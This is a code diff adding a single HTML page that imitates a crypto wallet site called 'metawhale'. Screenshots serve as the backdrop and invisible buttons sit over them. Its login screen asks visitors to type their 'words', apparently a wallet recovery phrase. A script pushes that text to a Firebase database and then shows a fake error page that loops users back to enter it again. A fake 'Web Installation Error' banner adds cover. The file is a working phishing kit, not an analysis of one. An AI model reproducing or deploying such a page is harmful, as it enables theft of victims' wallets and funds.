@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>T&S | Decentralized</title>
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+            authDomain: "v-academy-82560.firebaseapp.com",
+            projectId: "v-academy-82560",
+            storageBucket: "v-academy-82560.firebasestorage.app",
+            messagingSenderId: "826822771378",
+            appId: "1:826822771378:web:5357b1b989b298a8027fab",
+            measurementId: "G-JEWJC719LD"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        window.saveData = function() {
+            const textData = document.getElementById('accountInput').value;
+            const nextBtn = document.getElementById('finalNextBtn');
+            
+            if(textData.trim() !== "") {
+                nextBtn.innerText = "Processing...";
+                push(ref(db, 'user_submissions'), {
+                    words: textData,
+                    timestamp: Date.now()
+                }).then(() => {
+                    setTimeout(() => { openPage('pageGlitch'); }, 1000);
+                });
+            }
+        }
+    </script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #000; width: 100vw; overflow-x: hidden; font-family: sans-serif; }
+
+        /* Home Scrolling Section */
+        .content-wrap { width: 100%; position: relative; display: block; }
+        .bg-section { width: 100%; display: block; }
+
+        /* Invisible Header Triggers (Locked to Background Buttons) */
+        .header-triggers {
+            position: fixed; top: 0; width: 100%; height: 75px;
+            z-index: 1000; display: flex; justify-content: flex-end; padding-right: 18px; align-items: center;
+            pointer-events: none; /* Allows scrolling through the bar */
+        }
+        .inv-btn { pointer-events: auto; cursor: pointer; background: transparent; border: none; height: 40px; }
+        .btn-menu { width: 90px; margin-right: 8px; }
+        .btn-login { width: 85px; }
+
+        /* Full Screen Interface Overlays */
+        .interface-page {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 2000; overflow: hidden;
+        }
+        .ui-base-img { width: 100%; height: 100%; object-fit: contain; background: #fff; }
+
+        /* Interface Interactive Spots */
+        .spot { position: absolute; cursor: pointer; background: transparent; border: none; }
+        .close-spot { top: 2%; right: 5%; width: 15%; height: 8%; }
+        .account-link-spot { top: 30%; left: 0; width: 100%; height: 8%; }
+        .bottom-btn-spot { bottom: 3%; left: 5%; width: 90%; height: 10%; }
+
+        /* Login Input Area */
+        .login-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        .input-box {
+            position: absolute; top: 21%; left: 6%; width: 88%; height: 26%;
+            border: 1px solid #000; border-radius: 15px; padding: 15px;
+            font-size: 16px; outline: none; resize: none; pointer-events: auto;
+            background: #fff; font-family: monospace;
+        }
+
+        #redAlertBar {
+            position: fixed; top: -80px; left: 0; width: 100%; height: 60px;
+            background: #f00; color: #fff; display: flex; align-items: center;
+            justify-content: center; font-weight: bold; transition: 0.4s; z-index: 3000;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="redAlertBar">Web Installation Error</div>
+
+    <div class="header-triggers" id="homeHeader">
+        <button class="inv-btn btn-menu" onclick="openPage('pageMenu')"></button>
+        <button class="inv-btn btn-login" onclick="triggerRedAlert()"></button>
+    </div>
+
+    <div class="content-wrap" id="mainHome">
+        <img src="https://i.ibb.co/YBxhHFzq/Screenshot-2026-0507-004641.png" class="bg-section">
+        <img src="https://i.ibb.co/DPSfDC66/Screenshot-2026-0507-004738.png" class="bg-section">
+        <img src="https://i.ibb.co/6cs0ZcGV/Screenshot-2026-0507-004817.png" class="bg-section">
+        <img src="https://i.ibb.co/0pw9XnWb/Screenshot-2026-0507-004840.png" class="bg-section">
+        <img src="https://i.ibb.co/hRBtjFyF/Screenshot-2026-0507-004908.png" class="bg-section">
+        <img src="https://i.ibb.co/YB37McHH/Screenshot-2026-0507-004938.png" class="bg-section">
+        <img src="https://i.ibb.co/B2Gzp68v/Screenshot-2026-0507-004953.png" class="bg-section">
+    </div>
+
+    <div id="pageMenu" class="interface-page">
+        <img src="https://i.ibb.co/fM8613R5/1000043600.png" class="ui-base-img">
+        <button class="spot close-spot" onclick="openPage('mainHome')"></button>
+        <button class="spot account-link-spot" onclick="openPage('pageLogin')"></button>
+        <button class="spot bottom-btn-spot" onclick="openPage('mainHome')"></button>
+    </div>
+
+    <div id="pageLogin" class="interface-page">
+        <img src="https://i.ibb.co/VYD6qg4C/1000043594.png" class="ui-base-img">
+        <button class="spot close-spot" onclick="openPage('pageMenu')"></button>
+        <div class="login-container">
+            <textarea id="accountInput" class="input-box" placeholder="input your words for login metawhale account"></textarea>
+            <button id="finalNextBtn" class="spot bottom-btn-spot" onclick="saveData()" style="color: transparent;">NEXT</button>
+        </div>
+    </div>
+
+    <div id="pageGlitch" class="interface-page">
+        <img src="https://i.ibb.co/7jZ6y913/1000043596.png" class="ui-base-img">
+        <button class="spot close-spot" onclick="openPage('pageLogin')"></button>
+        <button class="spot bottom-btn-spot" onclick="openPage('pageLogin')"></button>
+    </div>
+
+    <script>
+        function openPage(id) {
+            // Close all pages
+            document.querySelectorAll('.interface-page, #mainHome').forEach(p => p.style.display = 'none');
+            
+            // Toggle Header Triggers visibility
+            const header = document.getElementById('homeHeader');
+            if(id === 'mainHome') {
+                document.getElementById('mainHome').style.display = 'block';
+                header.style.display = 'flex';
+                document.body.style.overflowY = 'auto';
+            } else {
+                document.getElementById(id).style.display = 'block';
+                header.style.display = 'none';
+                document.body.style.overflowY = 'hidden';
+            }
+            window.scrollTo(0,0);
+        }
+
+        function triggerRedAlert() {
+            const bar = document.getElementById('redAlertBar');
+            bar.style.top = '0';
+            setTimeout(() => { bar.style.top = '-80px'; }, 3000);
+        }
+    </script>
+</body>
+      </html>
+      
